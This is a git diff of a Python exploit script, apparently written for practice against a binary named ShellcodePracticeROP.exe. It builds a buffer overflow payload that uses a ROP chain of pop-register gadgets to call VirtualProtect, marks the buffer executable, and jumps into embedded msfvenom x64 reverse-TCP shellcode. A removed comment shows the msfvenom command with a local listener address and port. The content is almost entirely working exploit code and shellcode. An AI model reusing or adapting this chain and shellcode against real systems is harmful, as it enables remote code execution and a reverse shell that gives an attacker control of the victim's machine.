@@ -1,24 +1,26 @@
 import socket
 import struct
 
-# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.175 LPORT=6969 -f c -e generic/none
 
 shellcode = b""
 
-# shellcode += b"\x48\x83\xEC\x08"
-shellcode += b"\x48\xBA\x00P\xdd\x1b\xf6\x7f\x00\x00"
-shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"
-shellcode += b"\x48\xB8\x10\xeb\xf8\xb9\xfe\x7f\x00\x00"
+# int WSAStartup(
+#         WORD      wVersionRequired,   rcx
+#   [out] LPWSADATA lpWSAData           rdx
+# );
 
-# sub rsp, b8
-shellcode += b"\x48\x81\xEC\xE8\x09\x00\x00"
+# call WSASartup
+shellcode += b"\x48\xBA\x00P\xdd\x1b\xf6\x7f\x00\x00"       # mov rdx, 0x7ff61bdd5000
+shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"    # mov rcx, 0x202
+shellcode += b"\x48\xB8\x10\xeb\xf8\xb9\xfe\x7f\x00\x00"    # mov rax, WS2_32!WSAStartup
 
-shellcode += b"\xFF\xD0"
+shellcode += b"\x48\x81\xEC\xE8\x09\x00\x00"                # sub rsp, 0x9E8
+shellcode += b"\xFF\xD0"                                    # call rax
 
 # add rsp, b8
 # shellcode += b"\x48\x81\xC4\xE8\x09\x00\x00"
 
-
+# msfvenom shell_reverse_tcp
 shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
 shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe8\x87\x06\x21\x93"
 shellcode += b"\x6a\xb6\xd9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
@@ -110,10 +112,7 @@ BOOL VirtualProtect(
 
 
 '''
-b"\xb9\x02\x02\x00\x00\x48\x8d\x55\x90\xff\x15\x8d\x1e\x00\x00"
 
-# A's are overwriting current functions return address with the address of virtual protect,
-# which is why it's jumping to virtual protect.
 def gimme_buf(buff_addr, base_addr):
     payload = (
         b'q' +
@@ -121,49 +120,31 @@ def gimme_buf(buff_addr, base_addr):
         shellcode + 
         b'\x90' * (1591 - len(shellcode) - 2) + 
 
-     
+        # BOOL VirtualProtect(
+        #   [in]  LPVOID lpAddress,       rcx
+        #   [in]  SIZE_T dwSize,          rdx
+        #   [in]  DWORD  flNewProtect,    r8
+        #   [out] PDWORD lpflOldProtect   r9
+        # );
 
         # calling virtualprotect
-        struct.pack('<Q', 0x7ff61bdd100b) +  # pop r9 ; ret
-        struct.pack('<Q', 0x7ff61bdd5000) +  # some READWRITE
+        struct.pack('<Q', 0x7ff61bdd100b) +     # pop r9 ; ret
+        struct.pack('<Q', 0x7ff61bdd5000) +     # .data section ShellcodePracticeROP.exe
 
-        struct.pack('<Q', 0x7ff61bdd1008) +  # pop r8 ; ret
-        struct.pack('<Q', 0x40) +           # PAGE_EXECUTE_READWRITE
+        struct.pack('<Q', 0x7ff61bdd1008) +     # pop r8 ; ret
+        struct.pack('<Q', 0x40) +               # PAGE_EXECUTE_READWRITE
 
-        struct.pack('<Q', 0x7ff61bdd1004) +  # pop rdx ; ret
-        struct.pack('<Q', 0x7e6) +          # dwSize
+        struct.pack('<Q', 0x7ff61bdd1004) +     # pop rdx ; ret
+        struct.pack('<Q', 0x7e6) +              # dwSize
              
-        struct.pack('<Q', 0x7ff61bdd1006) +  # pop rcx ; ret
-        struct.pack('<Q', buff_addr) +  # buffer address
+        struct.pack('<Q', 0x7ff61bdd1006) +     # pop rcx ; ret
+        struct.pack('<Q', buff_addr) +          # buffer address
 
-        struct.pack('<Q', 0x7ffeb89dc470) +  # kernelbase!virtualprotect
+        struct.pack('<Q', 0x7ffeb89dc470) +     # kernelbase!virtualprotect
 
-
-        # # calling WSAStartup
-        # struct.pack('<Q', 0x7ff61bdd1004) +  # pop rdx ; ret
-        # struct.pack('<Q', 0x7ff61bdd5000) +  # some READWRITE
-
-        # struct.pack('<Q', 0x7ff61bdd1006) +  # pop rcx ; ret
-        # struct.pack('<Q', 0x202) +
-
-        # struct.pack('<Q', 0x7ff61bdd1001) +  # Extra ret for alignment?
-        # struct.pack('<Q', 0x00007ffeb9f8eb10) +  # WSAStartup
-
-
-     
-
-        struct.pack('<Q', buff_addr + 1)   # buffer address
-        
+        struct.pack('<Q', buff_addr + 1)        # buffer address
        
-        # shellcode
     )
-
-
-    '''
-    RBP gets 0x202
-    '''
-
-
     return payload
 
 def main():
